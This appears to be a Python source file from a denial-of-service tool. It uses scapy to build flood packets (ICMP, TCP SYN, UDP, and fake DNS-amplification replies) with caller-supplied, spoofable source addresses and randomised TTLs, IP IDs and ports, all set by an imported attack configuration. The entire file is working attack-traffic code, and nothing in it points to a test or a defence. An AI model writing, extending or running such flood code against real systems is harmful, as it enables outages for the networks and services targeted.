import random

from scapy.all import ICMP, IP, TCP, UDP, Raw

from attack_config import AMPLIFICATION_SOURCE_PORTS, ATTACK_PROTOCOLS, AttackConfig


def choose_protocol(protocol: str) -> str:
    if protocol == "mixed":
        return random.choice(ATTACK_PROTOCOLS)
    return protocol


def choose_ttl(config: AttackConfig) -> int:
    return random.randint(config.ttl_min, config.ttl_max)


def build_ip_layer(src_ip: str, dst_ip: str, ttl: int):
    return IP(src=src_ip, dst=dst_ip, ttl=ttl, id=random.randint(1, 65535))


def build_packet(src_ip: str, dst_ip: str, protocol: str, config: AttackConfig):
    payload = Raw(b"A" * config.payload_size)
    ip_layer = build_ip_layer(src_ip, dst_ip, choose_ttl(config))

    if protocol == "icmp":
        return ip_layer / ICMP() / payload

    if protocol == "tcp_syn":
        return build_tcp_syn_packet(ip_layer, payload, config)

    if protocol == "dns_amp":
        return build_dns_amp_packet(ip_layer, payload)

    return build_udp_packet(ip_layer, payload, config)


def build_tcp_syn_packet(ip_layer, payload, config: AttackConfig):
    return (
        ip_layer
        / TCP(
            sport=random.randint(1024, 65535),
            dport=random.choice(config.tcp_ports),
            flags="S",
        )
        / payload
    )


def build_dns_amp_packet(ip_layer, payload):
    return (
        ip_layer
        / UDP(
            sport=random.choice(AMPLIFICATION_SOURCE_PORTS),
            dport=random.randint(1024, 65535),
        )
        / payload
    )


def build_udp_packet(ip_layer, payload, config: AttackConfig):
    return (
        ip_layer
        / UDP(
            sport=random.randint(1024, 65535),
            dport=random.choice(config.udp_ports),
        )
        / payload
    )
